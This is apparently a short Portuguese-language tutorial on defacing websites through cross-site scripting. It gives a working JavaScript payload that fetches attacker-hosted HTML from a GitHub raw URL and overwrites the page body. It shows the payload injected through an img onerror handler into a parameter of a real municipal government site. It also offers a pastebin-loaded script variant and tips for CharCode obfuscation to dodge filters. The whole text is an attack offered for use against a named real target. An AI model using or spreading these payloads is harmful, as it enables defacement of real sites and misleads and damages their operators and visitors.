no caso este e o js, o link que voce botar no fetch ele deve encaminhar para um raw do html


fetch('https://raw.githubusercontent.com/Midia12/deface/main/index.html').then(r => r.text()).then(html => document.body.innerHTML = html);

no caso dessa aplicação seria para stored xss mas tambem server para xss normal

exemplo aonde eu aplico


https://sms.presidenteprudente.sp.gov.br/saanut/index.php?msg=<img%20src=x%20onerror="fetch('https://raw.githubusercontent.com/Midia12/deface/main/index.html').then(r%20=>%20r.text()).then(html%20=>%20document.body.innerHTML%20=%20html);">


O html que eu uso esta nesse link

https://raw.githubusercontent.com/Midia12/deface/main/index.html


obs: este js nao funciona com encurtadores por exemplo bit.ly


uma outra maneira caso voce querita usar o pastebin por exemplo voce pode usar o seguinte codigo

<script type="text/javascript" src="https://pastebin.com/raw/cEwQU0Ab"></script>

neste codigo do pastebin, ele esta em raw, ele este esta usando o metedo de deface CharCode, ele em CERTAS SITUAÇÕES pode sem melhor que outros metodos, caso queira converter para esse formato "ofuscado" voce pode usar este site: https://charcode98.neocities.org/
so não esqueca de adicionar as virgulas

mas existe chance do navegador bloquear por algumas policas de seguranca


detalhe que vale lembrar deface por xss 90% das vezes o html fica meio bugado, entao nao recomendo voce botar muitos efeitos ou slq oq, quanto mais simples melhor 
